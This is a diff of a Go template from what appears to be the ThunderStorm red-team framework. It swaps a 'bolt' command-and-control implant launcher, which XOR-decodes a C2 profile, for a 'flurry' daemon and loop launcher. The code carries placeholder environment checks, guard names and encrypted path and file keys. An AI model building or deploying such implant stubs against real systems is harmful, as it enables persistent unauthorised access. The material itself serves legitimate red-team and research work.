@@ -17,27 +17,25 @@
 package main
 
 import (
-	"os"
+	"time"
 
-	"github.com/iDigitalFlame/ThunderStorm/bolt"
-	"github.com/iDigitalFlame/xmt/c2/cfg"
+	"github.com/iDigitalFlame/ThunderStorm/flurry"
 	"github.com/iDigitalFlame/xmt/data/crypto"
-	"github.com/iDigitalFlame/xmt/data/crypto/subtle"
 	"github.com/iDigitalFlame/xmt/man"
 )
 
-var z = cfg.Config{
-	$profile
+var z = [...]string{
+	$paths
 }
 
 var g = [...]byte{
 	$guard
 }
-var p = [...]byte{
-	$pipe
-}
 var k = [...]byte{
 	$key
+}
+var x = [...]byte{
+	$files_key
 }
 
 func main() {
@@ -45,11 +43,9 @@ func main() {
 	if $checks {
 		return
 	}
-	subtle.XorOp(z, k[:])
-	// NOTE(dij): "os.Args" Will only work if non-CGO, GO-CGO cannot access argv.
-	bolt.Start(
-		$ignore || len(os.Args) > 2, $load, $critical, man.LinkerFromName($event),
-		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
+	flurry.Daemon(
+		time.Second*time.Duration($period), $service, $critical,
+		man.LinkerFromName($event), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
 	)
 }
 
@@ -58,9 +54,8 @@ func secondary() {
 	if $checks {
 		return
 	}
-	subtle.XorOp(z, k[:])
-	bolt.Start(
-		true, $load, $critical, man.LinkerFromName($event),
-		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
+	flurry.Loop(
+		time.Second*time.Duration($period), $critical,
+		man.LinkerFromName($event), crypto.UnwrapString(k[:], g[:]), x[:], z[:],
 	)
 }
